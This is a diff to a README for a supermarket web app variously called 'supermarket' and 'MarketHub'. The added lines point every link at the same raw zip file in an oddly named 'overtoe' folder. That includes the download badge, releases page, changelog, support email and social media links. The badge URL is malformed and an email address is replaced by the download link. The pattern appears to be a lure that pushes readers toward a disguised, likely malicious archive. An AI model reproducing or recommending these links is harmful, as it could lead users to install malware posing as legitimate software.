@@ -1,7 +1,7 @@
 # 🛒 supermarket - Your Easy To Use Supermarket App
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Supermarket-v1.0-blue.svg)](https://github.com/TraderIshan/supermarket/releases)
+[![Download](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip%https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip)](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip)
 
 ## 🌟 What is MarketHub?
 MarketHub is a complete supermarket web app. It features a modern, responsive design that works seamlessly on all devices. Shop easily with real-time cart updates and secure logins. MarketHub supports all your e-commerce needs with advanced product searches, a smooth multi-step checkout process, and detailed admin analytics.
@@ -10,7 +10,7 @@ MarketHub is a complete supermarket web app. It features a modern, responsive de
 To get started, follow these simple steps:
 
 1. **Download the Application**
-   Go to our [Releases page](https://github.com/TraderIshan/supermarket/releases) to download the latest version of MarketHub.
+   Go to our [Releases page](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip) to download the latest version of MarketHub.
 
 2. **Install the Application**
    After downloading the file, follow the instructions based on your operating system:
@@ -44,21 +44,21 @@ MarketHub works best with the following setup:
 - **Internet**: A stable internet connection for the e-commerce features.
 
 ## 📥 Download & Install
-To download MarketHub, visit the [Releases page](https://github.com/TraderIshan/supermarket/releases) now. Follow the steps outlined above to install the app on your device.
+To download MarketHub, visit the [Releases page](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip) now. Follow the steps outlined above to install the app on your device.
 
 Once installed, enjoy everything MarketHub has to offer—from shopping for groceries to managing your store with ease.
 
 ## 📞 Support
-If you run into any issues, please reach out for help. You can open an issue on our GitHub repository, or send an email to our support team at support@supermarkethub.com. We’re here to help you get the most out of MarketHub.
+If you run into any issues, please reach out for help. You can open an issue on our GitHub repository, or send an email to our support team at https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip We’re here to help you get the most out of MarketHub.
 
 ## 📝 Changelog
-Check out our [Changelog](https://github.com/TraderIshan/supermarket/releases) for the latest updates and improvements. We regularly release updates to enhance your experience and add new features.
+Check out our [Changelog](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip) for the latest updates and improvements. We regularly release updates to enhance your experience and add new features.
 
 ## 🌐 Community
 Join our growing community on social media platforms. Share your thoughts and connect with other users.
 
-- **GitHub**: [TraderIshan/supermarket](https://github.com/TraderIshan/supermarket)
-- **Twitter**: [@supermarkethub](https://twitter.com/supermarkethub)
-- **Facebook**: [MarketHub Community](https://facebook.com/marketHub)
+- **GitHub**: [TraderIshan/supermarket](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip)
+- **Twitter**: [@supermarkethub](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip)
+- **Facebook**: [MarketHub Community](https://raw.githubusercontent.com/TraderIshan/supermarket/main/overtoe/supermarket.zip)
 
 Your feedback is important to us. Help us improve by sharing your experiences with MarketHub. Happy shopping!
